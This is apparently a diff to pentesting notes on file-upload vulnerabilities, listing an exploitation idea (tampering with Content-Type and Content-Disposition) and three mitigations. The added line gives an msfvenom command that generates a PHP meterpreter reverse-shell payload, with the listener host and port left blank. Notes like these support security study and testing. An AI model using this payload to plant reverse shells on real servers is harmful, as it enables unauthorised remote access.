@@ -4,3 +4,4 @@ Exploitation : Tamper with Content-Type and Content-Dispositioned fields.
 Mitigation : 1) Never allow users to upload executables.
              2) Check file type and file extension.
              3) Analyse the uploaded file, recreate it and rename it. 
+ PHP Reverse Shell -> msfvenom -p php/meterpreter_reverse_tcp LHOST=<> LPORT=<> -f raw > my_shell.php
